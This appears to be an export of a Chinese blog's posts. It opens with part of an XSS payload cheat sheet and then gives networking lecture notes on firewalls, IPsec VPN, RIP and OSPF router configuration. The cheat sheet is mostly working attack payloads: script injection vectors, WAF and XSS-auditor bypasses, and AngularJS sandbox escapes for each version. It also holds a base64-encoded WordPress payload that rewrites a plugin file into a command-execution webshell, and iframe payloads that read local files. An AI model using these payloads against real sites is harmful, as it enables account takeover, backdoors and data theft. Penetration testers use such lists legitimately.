/&gt;&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click&lt;svg&gt;&lt;a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?&gt;&lt;circle r=400 /&gt;&lt;animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&amp;&gt;Mobile Only Event Handlers&lt;html ontouchstart=alert(1)&gt;&lt;html ontouchend=alert(1)&gt;&lt;html ontouchmove=alert(1)&gt;&lt;html ontouchcancel=alert(1)&gt;&lt;body onorientationchange=alert(1)&gt;Javascript Properties Functions&lt;svg onload=alert(navigator.connection.type)&gt;&lt;svg onload=alert(navigator.battery.level)&gt;&lt;svg onload=alert(navigator.battery.dischargingTime)&gt;&lt;svg onload=alert(navigator.battery.charging)&gt; &lt;svg onload=navigator.vibrate(500)&gt;&lt;svg onload=navigator.vibrate([500,300,100])&gt;Generic Self to Regular XSS &lt;iframe src=LOGOUT_URL onload=forms[0].submit()&gt;&lt;/iframe&gt;&lt;form method=post action=LOGIN_URL&gt;&lt;input name=USERNAME_PARAMETER_NAME value=USERNAME&gt;&lt;input name=PASSWORD_PARAMETER_NAME value=PASSWORD&gt;File Upload Injection in Filename“&gt;&lt;img src=1 onerror=alert(1)&gt;.gifInjection in Metadata$ exiftool -Artist='”&gt;&lt;img src=1 onerror=alert(1)&gt;’ FILENAME.jpegInjection with SVG File&lt;svg xmlns=”http://www.w3.org/2000/svg” onload=”alert(document.domain)”/&gt;Injection with GIF File as Source of Script (CSP Bypass)GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;Google ChromeAuditor Bypass&lt;script src=”data:&amp;comma;alert(1)//“&gt;&lt;script src=data:&amp;comma;alert(1)//&lt;script src=”//localhost:8080&amp;sol;1.js&amp;num;“&gt;&lt;script src=//localhost:8080&amp;sol;1.js&amp;num;&lt;link rel=import href=”data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;sol;script&amp;gt;“&gt;&lt;link rel=import href=data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;sol;script&amp;gt;&lt;svg&gt;&lt;animate xlink:href=#x attributeName=href values=&amp;#106;avascript:alert(1) /&gt;&lt;a id=x&gt;&lt;rect width=100 height=100 /&gt;&lt;/a&gt;Chrome &lt; v60 beta XSS-Auditor Bypass&lt;script src="data:,alert(1)%250A--&gt;Other Chrome XSS-Auditor Bypasses&lt;script&gt;alert(1)&lt;/script&lt;script&gt;alert(1)%0d%0a--&gt;%09&lt;/script&lt;x&gt;%00%00%00%00%00%00%00&lt;script&gt;alert(1)&lt;/script&gt;Safari XSS Vector&lt;script&gt;location.href;'javascript:alert%281%29'&lt;/script&gt;XSS PolyglotjaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3ePHP File for XHR Remote Call &lt;?php header(“Access-Control-Allow-Origin: *”); ?&gt;&lt;img src=1 onerror=alert(1)&gt;Server Log Avoidance &lt;svg onload=eval(URL.slice(-8))&gt;#alert(1)&lt;svg onload=eval(location.hash.slice(1)&gt;#alert(1)&lt;svg onload=innerHTML=location.hash&gt;#&lt;script&gt;alert(1)&lt;/script&gt;&lt;svg/onload=javascript:void(0)?void(0):void(0)?void(0):void(0)?void(0):void(0)?void(0):confirm(location)&gt; Shortest PoC &lt;base href=//0&gt;$ while:; do echo “alert(1)” | nc -lp80; donePortable WordPress RCE &lt;script/src=”data:&amp;comma;eval(atob(location.hash.slice(1)))//&amp;num;#eD1uZXcgWE1MSHR0cFJlcXVlc3QoKQ0KcD0nL3dwLWFkbWluL3BsdWdpbi1lZGl0b3IucGhwPycNCmY9J2ZpbGU9YWtpc21ldC9pbmRleC5waHAnDQp4Lm9wZW4oJ0dFVCcscCtmLDApDQp4LnNlbmQoKQ0KJD0nX3dwbm9uY2U9JysvY2UiIHZhbHVlPSIoW14iXSo/KSIvLmV4ZWMoeC5yZXNwb25zZVRleHQpWzFdKycmbmV3Y29udGVudD08Pz1gJF9HRVRbYnJ1dGVdYDsmYWN0aW9uPXVwZGF0ZSYnK2YNCngub3BlbignUE9TVCcscCtmLDEpDQp4LnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpDQp4LnNlbmQoJCk=http://DOMAIN/WP-ROOT/wp-content/plugins/akismet/index.php?brute=CMDInvisble JS Alert([,?,,,,??]=[]+&#123;&#125;,[???,??,????,???,,?????,????,??????,,,?????]=[!!?]+!?+?.?)[??+=?+?????+??????+???+??+????+??+???+?+??][??](?????+????+???+??+???+'`#JS!`')``Markdown XSS[a](javascript:confirm(1))[a](javascript://www.test.com%0Aprompt(1))[a](javascript://%0d%0aconfirm(1))[a](javascript://%0d%0aconfirm(1);com)[a](javascript:window.onerror=confirm;throw%201)[a]: (javascript:prompt(1))[a]:(?javascript:alert(1)) Angular JS'a'.constructor.fromCharCode=[].join;'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e'; &#123;&#123;'a'.constructor.prototype.charAt=[].join;eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;AngularJS Template Injection based XSS1.0.1 - 1.1.5&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;1.2.0 - 1.2.1&#123;&#123;a='constructor';b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()&#125;&#125;1.2.2 - 1.2.5&#123;&#123;'a'[&#123;toString:[].join,length:1,0:'__proto__'&#125;].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");&#125;&#125;1.2.6 - 1.2.18&#123;&#123;(_=''.sub).call.call(&#123;&#125;[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()&#125;&#125;1.2.19 - 1.2.23&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);&#125;&#125;1.2.24 - 1.2.29&#123;&#123;'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");&#125;&#125;1.3.0&#123;&#123;!ready &amp;&amp; (ready = true) &amp;&amp; ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) &amp;&amp; (apply = constructor) &amp;&amp; (valueOf = call) &amp;&amp; (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )) );&#125;&#125;1.3.1 - 1.3.2&#123;&#123; &#123;&#125;[&#123;toString:[].join,length:1,0:'__proto__'&#125;].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); &#125;&#125;1.3.3 - 1.3.18&#123;&#123;&#123;&#125;[&#123;toString:[].join,length:1,0:'__proto__'&#125;].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//'); &#125;&#125;1.3.19&#123;&#123; 'a'[&#123;toString:false,valueOf:[].join,length:1,0:'__proto__'&#125;].charAt=[].join; $eval('x=alert(1)//'); &#125;&#125;1.3.20&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');&#125;&#125;1.4.0 - 1.4.9&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;1.5.0 - 1.5.8&#123;&#123;x = &#123;'y':''.constructor.prototype&#125;; x['y'].charAt=[].join;$eval('x=alert(1)');&#125;&#125;1.5.9 - 1.5.11&#123;&#123; c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument=&#123;type:'Identifier',name:'foo'&#125;; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a;&#125;&#125;1.6.0+ (no Expression Sandbox)&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;Content Security Policy (CSP) bypass via JSONP endpointsGrab the target's CSP:curl -I http://example.com | grep 'Content-Security-Policy'Lightweight Markup LanguagesRubyDoc (.rdoc)XSS[JavaScript:alert(1)]Textile (.textile)"Test link":javascript:alert(1)reStructuredText (.rst)`Test link`__.__ javascript:alert(document.domain) Unicode characters†‡•&lt;img src=a onerror=javascript:alert('test')&gt;…‰€Sanbox Bypasses&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;&#123;&#123;a='constructor';b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()&#125;&#125;&#123;&#123;'a'[&#123;toString:[].join,length:1,0:'__proto__'&#125;].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");&#125;&#125;&#123;&#123;(_=''.sub).call.call(&#123;&#125;[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()&#125;&#125;&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);&#125;&#125;&#123;&#123;'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");&#125;&#125;&#123;&#123;!ready &amp;&amp; (ready = true) &amp;&amp; ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) &amp;&amp; (apply = constructor) &amp;&amp; (valueOf = call) &amp;&amp; (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )) );&#125;&#125;&#123;&#123; &#123;&#125;[&#123;toString:[].join,length:1,0:'__proto__'&#125;].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); &#125;&#125;&#123;&#123;&#123;&#125;[&#123;toString:[].join,length:1,0:'__proto__'&#125;].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//'); &#125;&#125;&#123;&#123; 'a'[&#123;toString:false,valueOf:[].join,length:1,0:'__proto__'&#125;].charAt=[].join; $eval('x=alert(1)//'); &#125;&#125;&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;&#123;&#123; c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument=&#123;type:'Identifier',name:'foo'&#125;; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a;&#125;&#125;&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125; Kona WAF (Akamai) Bypass\');confirm(1);//ModSecurity WAF Bypass Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html&lt;img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)&gt;Wordfence XSS Bypasses&lt;meter onmouseover="alert(1)"'"&gt;&gt;&lt;div&gt;&lt;meter onmouseover="alert(1)"&lt;/div&gt;"&gt;&gt;&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;Incapsula WAF Bypasses&lt;iframe/onload='this["src"]="javas&amp;Tab;cript:al"+"ert``"';&gt;&lt;img/src=q onerror='new Function`al\ert\`1\``'&gt;jQuery &lt; 3.0.0 XSS$.get('http://sakurity.com/jqueryxss')In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements: Find any cross domain requests to untrusted domains which may inadvertently execute script. Find any requests to trusted API endpoints where script can be injected into data sources.URL verification bypasses (works without &amp;#x09; too)javas&amp;#x09;cript://www.google.com/%0Aalert(1)Signal Messenger Payloadshttp://testdomain/?p=%3Ciframe%20src="/etc/passwd"%3E%3C/iframe%3E%20PENTESThttp://testdomain/?p=%3d%3Ciframe%20src=\\DESKTOP-[LOCALPATH]\Temp\rce.html%3Ehttp://testdomain/?p=%3d%3Ciframe%20src=\\xxx.xxx.xxx.xxx\Temp\rce.html%3Ehttp://testdomain/?p=%3Ciframe%20src="testfile.html"%3E%3C/iframe%3E%20PENTESThttp://testdomain/?p=%3Ciframe%20srcdoc="&lt;p&gt;PENTEST&lt;/p&gt;"%3E%3C/iframe%3Ehttp://testdomain/?p=%3Caudio%20autoplay%20src="/usr/share/sounds/gnome/default/alerts/bark.ogg"%20type="audio/ogg"%3E%3C/audio%3Ehttp://testdomain/?p=%3Cvideo%20autoplay%20loop%20src="/usr/share/help/C/gnome-help/figures/display-dual-monitors.webm"%20type="video/webm"%3E%3C/video%3Ehttp://testdomain/?p=%3Cform%20method='POST'%20action='https://domain.de/url'%3E%3Cinput%20type='text'%20name='data'%20value='from_form'/%3E%3Cinput%20type='submit'/%3E%3C/form%3EWaf Engine Bypass&lt;svg onload\r\n=$.globalEval("al"+"ert()");&gt;&lt;img onload\r\n=$.globalEval("al"+"ert()");&gt;&lt;iframe src="\\" onload\r\n=$.globalEval("al"+"ert()");&gt;]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络十]]></title>
    <url>%2F2019%2F09%2F11%2F%E7%BD%91%E7%BB%9C%E5%8D%81%2F</url>
    <content type="text"><![CDATA[防火墙Firewall1.常见的安全设备； （1）防火墙Firewall：实现区域隔离，实现对流量的控制 （2）上网行为管理：对用户的上网行为进行控制和管理； （3）IDS：入侵检测系统，对进入内网的可疑流量进行检测和报警。==》门卫 （4）IPS：入侵防御系统，一旦发现可疑流量就会立即进行阻断，并记录日志。===》警察。 （5）WAF：Web Application Firewall，为服务器做攻击防护。 2.防火墙基本概念​ 吞吐量：在不丢包的情况下单位时间内通过的数据包数量​ 时延：数据包第一个比特进入防火墙到最后一比特从防火墙输出的时间间隔​ 丢包率：通过防火墙传送时所丢失数据包数量占所发送数据包的比率​ 并发连接数：防火墙能够同时处理的点对点连接的最大数目​ 新建连接数：在不丢包的情况下每秒可以建立的最大连接数 3.防火墙的分类：软件防火墙和硬件防火墙。 （1）包过滤防火墙：可基于3层和4层数据做过滤。 优点：转发效率高，但是管理麻烦；不能基于应用层数据做过滤。 （2）应用网关型防火墙：给用户所有的流量做代理，也叫做代理防火墙。 特点：可以基于应用层数据做过滤，但是效率比较低；当网络流量过大时，容易产生性能瓶颈。 （3）状态检测防火墙：可以基于数据访问的状态做记录（状态缓存），基于数据流做转发，后续报文直接查缓存信息。 特点：提高了转发效率，但是对应用层的数据检测不够深入。 （4）DPI：Deep Packet Inspection深度包监测防火墙。 特点：可以高效的对应用层数据做监测。 4.防火墙的部署方式； =============可以对数据做识别和控制============= （1）透明模式：把防火墙当交换机用，优点是对现有的网络改动最小；缺点就是不够安全。 （2）路由模式：把防火墙当路由器用，优点是更加安全；但是对网络改动比较大。 （3）混杂模式：把防火墙有些接口当二层接口使用；有些接口当三层接口使用。 =============只能对数据做识别，把日志发送给日志服务器。============= （4）旁路模式：在核心交换机上开启端口镜像，把流量复制一份发送给“防火墙/上网行为”，由防火墙做流量识别，把日志发送出去。 5.防火墙实验步骤： （1）环境说明： XP：模拟Inside区域——————————————VMNET1——————192.168.1.0/24 DMZ: 模拟内网的web服务器区域—————VMNET2——————172.16.1.0/24 Outside：模拟外网服务器区域———————VMNET3——————100.1.1.0/24 （2）准备多网卡的环境： 在VMware中添加多个虚拟网卡：编辑————虚拟网络适配器 在防火墙上，添加最少3块虚拟网卡，依次连接VMnet1、net2、net3. XP：模拟Inside区域，192.168.1.1——————————————VMNET1——————192.168.1.254/24 DMZ: 模拟内网的web服务器区域,172.16.1.1——————VMNET2——————172.16.1.254/24 Outside：模拟外网服务器区域，100.1.1.2———————VMNET3——————100.1.1.1/24 （3）在真机里开启VMNET1，并配置为192.168.1.0/24网段，测试网络连通性，并使用web界面来登录防火墙。 https://192.168.1.254:8080/ superman / talent （4）给防火墙配置IP 网络管理————&gt;接口——————&gt;给不同的接口配置不同的IP，并标注为不同的区域 （5）给防火墙划分区域，允许区域之间的访问。 资源管理————&gt;区域————&gt;把不同的接口绑定到不同的区域里 （6）添加策略（ACL），配置区域之间的互访（这个模拟器由bug） 防火墙————&gt;访问控制————&gt;添加策略 添加3条：inside————&gt;outside dmz————&gt;outside inside————&gt;dmz 在内网和DMZ区域的设备上做测试，看是否能ping通外网。 ============》路由问题：不能ping通，原因是外网的2003上没有配置网关。 （7）去掉外网服务器上的网关，在防火墙上把内网和DMZ区域的网段，做NAT转换。 定义内网允许上网的网段和WAN的IP：资源管理————&gt;地址————&gt;子网（网段），主机]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络九]]></title>
    <url>%2F2019%2F09%2F10%2F%E7%BD%91%E7%BB%9C%E4%B9%9D%2F</url>
    <content type="text"><![CDATA[1.VPN：Virtaul Private Network虚拟私有网络，实现内网之间的通信。私网之间的通信方式： 1.专线，安全性高，但是成本比较高 2.租用链路 3.VPN 2.网络安全的方面： （1）数据被窃听：保障数据的机密性， （2）被篡改；保障数据的完整性， （3）防重放：给每个数据一个编号Sequence， （4）源认证；保障数据的发送和接收方都是合法的， 3.常见的算法 （1）对称加密：加密和解密用的是同一把钥匙（算法） 常见的对称加密算法：DES、3DES、AES 特点：速度快，但是存在被窃听的危险。 （2）非对称加密：加密和解密用的不是一把钥匙，是一个秘钥对————公钥和私钥。 基本传输方式：用公钥进行加密，用私钥来进行解密。 非对称加密算法：DH算法和RSA（证书） 特点：速度慢，但是更安全。 （3）哈希算法：校验数据的完整性，防止被篡改。 常见算法：md5/sha/Hmac 4.IpsecVPN： 协商分为2个阶段： 第一阶段用来协商秘钥的安全性；使用的是isakmp协议叫做互联网秘钥交互协议。 第二阶段是用来保证数据的安全性。 （1）第一步：先实现公网通信。​ ip route 0.0.0.0 0.0.0.0 12.1.1.2 （2）第二步：定义第一阶段，密码和密码的加密方式等​ R1(config)#crypto isakmp policy 10 #定义第一阶段的策略，编号为10​ R1(config-isakmp)#authentication pre-share #认证方式为预共享密码​ R1(config-isakmp)#encryption 3des #加密方式为3des​ R1(config-isakmp)#hash sha #保证数据完整性，用的是sha​ R1(config-isakmp)#group 2 #使用非对称加密算法对秘钥进行二次加密​ R1(config)#crypto isakmp key test.123 address 45.1.1.2 #定义密码为test.123，指定对端的公网地址45.1.1.2 （3）第三步：定义第二阶段，保证数据的安全性​ R1(config)#crypto ipsec transform-set SET esp-3des esp-sha-hmac #定义转换集，保证数据安全性，3des是用来加密的；sha是用来保证完整性的​ R1(cfg-crypto-trans)#mode tunnel #设置传输模式为隧道模式，默认配置​ （4）第四步：定义感兴趣流量（对哪些流量进行加密，只有定义的感兴趣流量之间才能通信）​ R1(config)#access-list 100 permit ip host 192.168.1.1 host 192.168.2.1 //允许192.168.1.1和192.168.2.1之间通信 （5）第五步：把第2/3/4步绑到一起​ R1(config)#crypto map VPN 10 ipsec-isakmp //定义一个策略图，名称叫VPN，编号是10​ R1(config-crypto-map)#match address 100 //匹配感兴趣流量​ R1(config-crypto-map)#set peer 45.1.1.2 //设置对端公网地址45.1.1.2​ R1(config-crypto-map)#set transform-set SET //匹配转换集​ R1(config-crypto-map)#exit （6）第六步：应用到接口​ R1(config)#int f0/1​ R1(config-if)#crypto map VPN （7）检查命令：​ R1#show crypto engine connections active //查看加密和解密的数据包 （8）后续需求：​ 实现PC2和PC4之间的通信，修改ACL​ R1(config)#access-list 100 permit ip host 192.168.1.2 host 192.168.2.2 #同时也要在对端添加 （9）实现NAT​ R1(config)#access-list 110 deny ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255 #在NAT流量里拒绝VPN流量，允许其他​ R1(config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 any​ R1(config)#ip nat inside source list 110 interface f0/1 overload #做NAT转换 （10）检查命令：R1#show crypto isakmp policy #查看一阶段的策略 R1#show crypto isakmp sa #SA叫做安全关联，是两个路由器协商完成后的策略存储方式 IPv4 Crypto ISAKMP SA dst src state conn-id status #Status状态是Active表示可用 45.1.1.2 12.1.1.1 QM_IDLE 1001 ACTIVE R5#show crypto isakmp key #一阶段，查看秘钥 Keyring Hostname/Address Preshared Key default 12.1.1.1 test.123 R5#show crypto ipsec transform-set #检查第二阶段的转换集（保证数据的可靠性） Transform set default: { esp-aes esp-sha-hmac } #default，默认策略 will negotiate = { Transport, }, Transform set shanghai: { esp-3des esp-sha-hmac } #自定义的shanghai策略 will negotiate = { Tunnel, }, R5#show crypto ipsec sa #查看第二阶段的sa（协商成功后的策略） R5#show crypto map #查看map的内容 Crypto Map IPv4 &quot;SH&quot; 10 ipsec-isakmp #map名字叫SH，编号为10 Peer = 12.1.1.1 #对端的公网Ip Extended IP access list 100 #感兴趣流量 access-list 100 permit ip host 192.168.2.1 host 192.168.1.1 access-list 100 permit ip host 192.168.2.2 host 192.168.1.2 Current peer: 12.1.1.1 Security association lifetime: 4608000 kilobytes/3600 seconds Responder-Only (Y/N): N PFS (Y/N): N Transform sets={ #第二阶段的转换集 shanghai: { esp-3des esp-sha-hmac } , } Interfaces using crypto map SH: #map应用的接口 FastEthernet0/0 authentication pre-share 认证方式是预共享秘钥的方式encryption 加密]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络八]]></title>
    <url>%2F2019%2F09%2F09%2F%E7%BD%91%E7%BB%9C%E5%85%AB%2F</url>
    <content type="text"><![CDATA[RIP1.路由协议：静态路由和动态路由 静态路由的特点：优先级比较高，但是配置麻烦，不能自动适应拓扑改变。 动态路由的特点：管理员手工告诉路由器之间使用什么语言（协议）进行交流，路由器之间自动进行路由条目的学习；还能自动适应拓扑变化。 动态路由协议的分类： 距离矢量路由协议：路由器没有全网拓扑，只是从邻居学到的路由（“道听途说”）====》路标。 代表：RIP（公有）、eigrp（Cisco私有） 链路状态路由协议：路由器上都有全网拓扑，会根据拓扑情况计算最优路径放到路由表中====》地图 代表：OSPF、IS-IS 2.路由相关概念： AD：管理距离，也叫做优先级。范围是0——255，越小越优先。C：最优的；其次是S优先级为1. 度量值：路由器把最优路径放到路由表中的“判断依据”，常见的度量值；跳数、带宽、成本（cost） 收敛：（从发送hello包开始）使所有路由表都达到一致状态的过程 3.RIP的特点： 属于距离矢量路由协议的典型代表；管理距离（AD，优先级）默认是120. RIp使用的是UDP协议来承载路由条目，端口号是udp-520. 更新方式：定期更新（每隔30s更新一次）、广播更新、全路由表更新。 RIp是以跳数为度量值（metric），最大跳数是15，如果跳数为16，认为不可达。 RIPv1在更新路由的时候，不携带子网掩码===》只能支持有类的路由条目 RIPv2是无类的路由协议，更新的时候携带子网掩码。使用的组播更新，组播地址是224.0.0.9. 4.RIP的环路问题 （1）产生原因；由于更新时间太长，可能导致发生故障的路由信息不能及时更新出去。 （2）解决问题：水平分割，一个接口学到的路由条目，不再从这个接口发送出去。 R2(config)#int f0/0 R2(config-if)#ip split-horizon //开启水平分割，默认情况下是开启的状态。 5.RIp的基本配置： （1）配置： 配置IP；配置rip；测试回还口是否通信； 在R1上启动一个回还口44.2.2.2/24；发现在R2上只能ping通44.2.2.2，不能ping通44.1.1.1====》R1上优先选择自己的回还口。 清空路由表的命令：clear ip route * router rip network 11.0.0.0 network 12.0.0.0 network 15.0.0.0 查看路由协议的属性： show ip protocols （2）查看路由表； R1#show ip route [120是管理距离；2表示metric度量值——跳数] R 44.0.0.0/8 [120/2] via 15.1.1.2, 00:00:16, FastEthernet0/1 R 45.0.0.0/8 [120/1] via 15.1.1.2, 00:00:16, FastEthernet0/1 R 55.0.0.0/8 [120/1] via 15.1.1.2, 00:00:16, FastEthernet0/1 （3）RIpv2的配置； router rip version 2 //使用rip版本2 network 12.1.1.0 //宣告自己的直连网段 no auto-summary //关闭自动汇总后，更新的时候携带子网掩码；会自动把无类的路由为有类的路由进行通告； 1.配置思路：从内网到外网。内网互通（单臂路由）————外网互通（路由）————NAT（把私网地址转换为公网地址） （1）vlan划分： SW1(config-if)#int f0/2SW1(config-if)#switchport mode accessSW1(config-if)#switchport access vlan 80SW1(config-if)#int tSW1(config-if)#int f0/3SW1(config-if)#switchport mode trunkSW1(config-if)#switchport trunk allowed vlan all （2）单臂路由基本配置； R1(config-if)#int f0/0.70R1(config-subif)#encapsulation dot1Q 70R1(config-subif)#ip add 192.168.70.254 255.255.255.0R1(config-subif)#no sh （3）DHCP中继代理：当客户端的网段和DHCP不在同一个网段时，需要在”网关接口“配置DHCP中继代理。 int f0/1.10 ip helper-address 192.168.40.1 //指定DHCP的Ip （4）实现外网通信，出口路由器是通过默认路由来实现。如果是运营商的路由器一般是通过动态路由协议。 （5）把私网地址转换为公网地址====NAT 第一步：声明内外网口 R1(config)#int f0/0.70R1(config-subif)#ip nat insideR1(config-subif)#int f0/0.80R1(config-subif)#ip nat insideR1(config-subif)#int f0/1R1(config-if)#ip nat outsideR1(config-if)#exit第二步：定义上网的网段R1(config)#access-list 10 permit 192.168.70.0 0.0.0.255R1(config)#access-list 10 permit 192.168.80.0 0.0.0.255第三步：把私网转换为出接口IpR1(config)#ip nat inside source list 10 int f0/1 overload OSPF 1.路由协议分类： 动态和静态。 AS：自治系统，根据路由协议是否工作在一个AS中，把路由协议分为IGP和EGP。 IGP：内部网关协议，同一个AS内部使用； 动态路由协议： 距离矢量路由协议:rip,每个路由器没有全网拓扑，只能从邻居收到路由信息。 链路状态路由协议:ospf，is-is每个路由器都有全网拓扑，自己根据自己的数据库计算出来最优路径。 EGP：外网网关协议，不同的AS之间通信。代表BGP。 划分AS的原因：不同的路由协议有一个极限值；方便管理。 2.OSPF的基本概念：是链路状态路由协议的典型代表，是公有协议；适用于大中型网络。 （1）OSPF（Open Shortest Path First）开放式最短路径优先，每个路由器以自己为根会计算出来一个“无环”的最优路径。 组播地址：224.0.0.5和224.0.0.6 ospf的管理距离是110；rip的管理距离是120； hello时间是10s；dead时间是40s； 更新：组播更新； 支持VLSM（支持无类的路由协议）； 支持认证； 支持区域划分； （2） OSPF的度量值为COST，参考带宽是100M。 COST= 108/BW（b/s） 最短路径是基于接口指定的代价（cost）计算的 （3）LSDB：链路状态数据库； LSA：链路状态通告（基本信息） （4）Router-id：路由器唯一标识，用来标识每个路由器的身份。 选举规则： 手工指定的优先级最高； 回还口IP地址最大； 物理接口Ip地址最大； 3.OSPf中有3张表 （1）邻居表：通过发送hello，寻找网络中的其他邻居。 （2）链路状态数据库（LSDB：link State Database）：交互LSA，形成LSDB。 LSA（Link State Advertisement）：链路状态通告（路由的基本信息），描述每个路由器的基本接口信息、网络类型和IP地址等。 （3）路由表：使用的是SPF算法，根据LSDB中的信息计算最优路由。 5.OSPF的5种包： （1）hello：发送hello，建立和维持邻居关系。 （2）DBD：Database Description数据库描述，类似于菜单/目录。 （3）LSR：Link State Request，链路状态请求，请求自己没有的LSA条目。===》点你喜欢吃的菜。 （4）LSU：Link State Update，链路状态更新，响应LSR。=====》服务员给你确认一下菜单 （5）LSACK：Link State Acknowledge，链路状态确认，响应LSR和LSU。 说明：LSA不是一种数据包，而是数据包里的条目。（菜单里的某个菜名） 7.OSPF的7种状态机： ==========================邻居关系：只交互Hello========================== （1）Down状态：开始发送hello，但是没有发现网络中有任何其他路由器；或者接口直接处于故障状态。 （2）Init状态：从邻居收到了hello包，但是hello包中没有自己的Router-id。建立了单向的邻居关系。 （3）2-Way状态：从邻居收到的hello里，包含了自己的Router-id。 ==========================邻接关系：交互LSA========================== （4）Exstart状态：交互DBD报文，用于选举主从（为了决定哪个路由器先发送DBD报文；一般只有3个包左右） （5）Exchange；大量的DBD报文开始交互。====》翻菜单 （6）Loading：交互LSR、LSU、LSACK。====》LSR（你点菜），LSU（点菜宝），LSACK（报全部的菜名） （7）Full：交互完成===》菜齐了。 8.ospf中划分区域的意义 （1）防止过多的LSA对硬件资源的消耗； （2）在大型网络中，如果一条链路发生故障，会导致全网进行收敛。 （3）解决方法：进行区域划分 区域ID：区域唯一标识，可以用十进制数表示；也可以用IP地址的形式表示。 区域分为2大类： 骨干区域，只有一个编号，就是area 0；非骨干区域之间通信，必须要经过骨干区域。 非骨干区域，编号是任何的非0的区域。 9.ospf的基本配置： （1）基本配置： router ospf 110 //110表示ospf的进程号，本地有效；不会影响邻居建立 router-id 22.1.1.1 //指定路由器的唯一标识：Router-id network 22.1.1.0 0.0.0.255 area 0 //宣告自己的直连网段+反掩码（必须是连续的0或1）+区域ID network 23.1.1.0 0.0.0.255 area 0 （2）3张表： R2#show ip ospf neighbor //邻居关系表 邻居的Router-id 优先级 状态，full邻接 死亡时间 邻居的接口Ip 自己和邻接相连的接口 Neighbor ID Pri State Dead Time Address Interface 33.1.1.1 1 FULL/DR 00:00:30 23.1.1.2 FastEthernet0/1 R2#show ip ospf database //查看链路状态数据库 R2#show ip route //如果是o开头的（域内路由）表示从同一个区域学到的路由条目； //如果是O 